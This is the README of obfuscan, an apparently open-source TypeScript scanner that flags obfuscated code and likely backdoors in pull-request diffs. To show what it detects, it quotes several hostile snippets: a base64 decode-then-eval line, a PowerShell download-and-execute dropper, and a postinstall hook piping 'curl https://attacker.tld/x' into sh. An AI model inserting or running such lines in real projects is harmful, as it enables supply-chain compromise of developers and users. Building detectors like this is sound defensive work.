# obfuscan

Detect obfuscated code and likely backdoors in pull-request diffs. Multi-language. Embeddable. Diff-aware. Pure TypeScript.

[![npm](https://img.shields.io/npm/v/@obfuscan/core)](https://www.npmjs.com/package/@obfuscan/core)
[![license](https://img.shields.io/npm/l/@obfuscan/core)](./LICENSE)
[![ci](https://github.com/ByteBardOrg/obfuscan/actions/workflows/ci.yml/badge.svg)](https://github.com/ByteBardOrg/obfuscan/actions)

## What it does

obfuscan reads a unified diff (or an explicit file list) and returns findings that flag the two patterns nearly every supply-chain attack relies on:

1. **Obfuscation** — code deliberately hard for a human to read: high-entropy string blobs, encoded payload arrays, bidi/homoglyph identifiers, machine-generated identifier names.
2. **Dynamic / install-time execution** — code with the means to run attacker-controlled bytes: `eval`, `Function`, `Invoke-Expression`, `pickle.loads`, `Reflection.Assembly.Load`, `postinstall` hooks, `curl … | sh`, etc.

When the two combine — a decoder feeding a sink — that's the highest-precision malware shape across every language we've tested. obfuscan flags it.

```
$ obfuscan scan diff.patch
src/loader.ts:42:0 BLOCK [obf.decode-then-exec.typescript]
  Decoded data is being executed via a dynamic sink.

  > eval(Buffer.from(_0x4f3a[1], 'base64').toString())

src/loader.ts:11:0 WARN [obf.encoded-array-fingerprint]
  Found 40 encoded-looking string literals (100% of literals).

package.json:23:5 BLOCK [obf.manifest-install-script]
  postinstall hook fetches a URL and pipes the result to a shell.

3 findings · 2 block · 1 warn
```

## Why

Existing tools each cover a slice:

- **Semgrep** — generic AST patterns, but no entropy/data-flow and not focused on obfuscation.
- **Bandit / njsscan** — single-language.
- **Apiiro PRevent** — Python runtime, GitHub-Action-shaped, not a library.
- **Datadog GuardDog** — scans published packages, not PRs.
- **Socket.dev / Snyk** — closed source SaaS.

**The gap obfuscan fills**: a TypeScript-native, embeddable, multi-language, diff-aware detector. Drop it into any Node tool — a Git client, a Husky hook, a VS Code extension, a custom GitHub Action, a CI script — and get findings on the lines that actually changed.

## Install

```bash
npm install @obfuscan/core @obfuscan/rules
# or
pnpm add @obfuscan/core @obfuscan/rules
```

The `core` package ships the engine; `rules` ships language configs and tree-sitter query assets, not parser grammars. Hosts that want parser-backed custom detectors provide their own grammars via `RuleSet.loadGrammar()` / `GrammarHandle.parse()`. We use SemVer for the engine and CalVer (`2026.04.0`) for the rules.

## GitHub Action

Run obfuscan directly in pull request CI and have it annotate findings, write a job summary, and upsert a Markdown PR comment.

```yaml
name: obfuscan

on:
  pull_request:

permissions:
  contents: read
  pull-requests: read
  issues: write

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - uses: ByteBardOrg/obfuscan-action@v1
        with:
          fail-on: block
```

Useful inputs:

- `fail-on`: `block` (default), `warn`, or `never`.
- `min-severity`: `info` (default), `warn`, or `block`.
- `comment`: `true` (default) or `false`.
- `max-findings`: maximum findings shown in the Markdown report, default `50`.
- `disabled-detectors`: comma or newline separated detector ids.
- `allowlist-path`: defaults to `.obfuscan/allowlist.json`.

The Marketplace action is distributed from `ByteBardOrg/obfuscan-action`. Generate that repo's contents locally with `cd packages/action && npm run marketplace`; the generated `marketplace/obfuscan-action` folder is ignored in this repo.

## Using `@obfuscan/rules`

`@obfuscan/core` loads language configs from `@obfuscan/rules` by default, so normal usage is just installing both packages.

```ts
import { scan } from "@obfuscan/core";
import * as fs from "node:fs/promises";

const result = await scan(
  { diff: await fs.readFile("pr.diff", "utf8") },
  { fileResolver: (p) => fs.readFile(p, "utf8") },
);
```

You can also load a custom rules directory:

```ts
import { loadRuleSet, scan } from "@obfuscan/core";
import * as fs from "node:fs/promises";

const rules = await loadRuleSet({
  languageDir: "./my-rules/languages",
  queryDir: "./my-rules/queries",
});

const result = await scan(
  { paths: ["src/file.ts"] },
  {
    fileResolver: (p) => fs.readFile(p, "utf8"),
    rules,
  },
);
```

Notes:

- `@obfuscan/core` uses SemVer.
- `@obfuscan/rules` uses CalVer (`YYYY.MM.PATCH`) and can update independently.
- Rule config schema: [`packages/rules/languages/_schema.json`](./packages/rules/languages/_schema.json)

## Quick start


### Library

```ts
import { scan } from "@obfuscan/core";
import * as fs from "node:fs/promises";

const result = await scan(
  { diff: await fs.readFile("pr.diff", "utf8") },
  { fileResolver: (path) => fs.readFile(path, "utf8") },
);

for (const f of result.findings) {
  if (f.severity === "block") {
    console.error(`${f.file}:${f.line} BLOCK [${f.ruleId}] ${f.reason}`);
  }
}
```
## What it catches (with real examples)

- **Decode-then-execute**, the canonical malware shape:
  ```js
  eval(Buffer.from(_0x4f3a[1], 'base64').toString())
  ```
- **String-array obfuscator output** (verbatim from the 2026 axios compromise):
  ```js
  var _0x4f3a = ['dGVzdA==', 'aGVsbG8=', /* …128 more… */];
  ```
- **PowerShell network-then-exec droppers**:
  ```powershell
  IEX (New-Object Net.WebClient).DownloadString($url)
  ```
- **`curl | sh` in install hooks**:
  ```json
  "postinstall": "curl https://attacker.tld/x | sh"
  ```
- **Trojan Source bidi attacks** (any language with Unicode source).
- **Pickle / Marshal / unserialize on untrusted input.**
- **Setup.py top-level imperative code** that fetches and executes at install time.
- **build.rs** with suspicious network behavior.
- **Homoglyph identifiers** (Latin/Cyrillic mixing).

The detector list is in [`docs/detectors.md`](./docs/detectors.md). See [`docs/coverage.md`](./docs/coverage.md) for per-language coverage.

## Language coverage

Universal detectors run on any readable text file.

Language-aware detectors are currently implemented for:

- Tier 1: JavaScript, TypeScript, Python, PowerShell, Bash, PHP, Ruby
- Tier 2: Go, Rust, C#, Java, Kotlin, Lua, Perl, VBScript

Path-based manifest detectors currently target `package.json`, `setup.py`, `build.rs`, GitHub Actions workflows, and `Dockerfile`.

See [`docs/coverage.md`](./docs/coverage.md) for the up-to-date matrix by rule and language.

## How it works

obfuscan runs a layered pipeline over each file selected by `diff` or `paths` input:

```
input → file context → detectors → suppress/filter → sorted findings
```

- **Layer A — universal, raw text.** Shannon entropy on long literals, line length, bidi/homoglyph control chars, encoded-string-array regex. Fires on every language.
- **Layer B — language-aware heuristics.** Generic detectors routed by detected language id: dynamic execution with non-literals, decode-then-exec, network-then-exec, deserializer usage, suspicious I/O clusters, and related patterns.
- **Layer C — manifest/path rules.** Specialized detectors for `package.json`, `setup.py`, `build.rs`, `.github/workflows/*`, and `Dockerfile`.

Each detector emits findings with a 0–10 score and `info` / `warn` / `block` severity. Findings are then filtered (diff ranges, directives, allowlists), sorted, and returned in `ScanResult`.

Architecture details: [`docs/architecture.md`](./docs/architecture.md).

## Suppression

False positives are inevitable in security tooling. obfuscan ships first-class suppression:

- **Path allowlist** for vendored / minified / generated code.
- **Per-finding suppression** keyed by `(ruleId, sha256(snippet))`, persisted by hosts in `.obfuscan/allowlist.json` via `loadAllowlist()`, `saveAllowlist()`, and `hashSnippet()`.
- **In-source comment suppressions**: `// obfuscan-disable-next-line obf.decode-then-exec`.

## Honest limits

- Static analysis cannot defeat static analysis. xz is the existence proof. The goal is to raise attacker cost and surface unsophisticated attempts — not to prove malice.
- Binary blobs need a separate scanner (YARA, file-magic). obfuscan flags the metadata signal but doesn't analyze byte content.
- Compiled-language and build-system backdoors still need manual review and additional build-focused rules.
- There is no built-in LLM verifier in `@obfuscan/core` today.

## Comparison

|  | obfuscan | Semgrep | PRevent | GuardDog | Bandit |
|---|---|---|---|---|---|
| Embeddable as TS/JS library | ✓ | — | — | — | — |
| Diff/PR-aware | ✓ | partial | ✓ | — | — |
| Multi-language | ✓ (15+ deep, 60+ universal) | ✓ | ✓ (15) | ✓ (3) | — |
| Entropy / data-flow | ✓ | — | ✓ | ✓ | partial |
| Manifest detectors | ✓ | partial | ✓ | ✓ | — |
| Pure offline, no SaaS | ✓ | ✓ | ✓ | ✓ | ✓ |
| Open source | ✓ Apache-2.0 | LGPL/commercial | Apache-2.0 | Apache-2.0 | Apache-2.0 |

## Project status

Pre-1.0. The detector framework, scoring, suppression, and tier-1/tier-2 language rules are stable. Breaking API changes are batched into minor releases until 1.0; rule changes ship as patch CalVer releases of `@obfuscan/rules` and never require an engine update.

## Roadmap

- [x] Tier-1 language rules (JS/TS, Python, PowerShell, Bash, PHP, Ruby)
- [x] Manifest detectors for npm, PyPI, GitHub Actions, Dockerfile
- [x] Tier-2 language rules (Go, Rust, C#, Java, Kotlin, Lua, Perl, VBScript)
- [ ] `@obfuscan/cli` 1.0 with SARIF output
- [x] `@obfuscan/github-action` v1
- [ ] `@obfuscan/llm-verify` optional Layer-D package
- [ ] Reproducible benchmark suite against [Datadog malicious-software-packages-dataset](https://github.com/DataDog/malicious-software-packages-dataset)

## Contributing

Adding rules is the highest-leverage contribution. Most rule contributions are 3-line PRs to a JSON file. See [CONTRIBUTING.md](./CONTRIBUTING.md).

Bug reports, false-positive reports, and bypasses welcome — see [SECURITY.md](./SECURITY.md) for how to report bypasses privately.

## Acknowledgements

obfuscan's detection model is informed by published work from Apiiro (PRevent), Datadog (GuardDog, BewAIre), Phylum, Veracode, and the academic literature on entropy-based malware detection. The public taxonomy of PowerShell obfuscation comes from Daniel Bohannon's Invoke-Obfuscation. Where a specific paper or post directly informed a detector, it is cited inline in the source.

## License

Apache-2.0. See [LICENSE](./LICENSE).
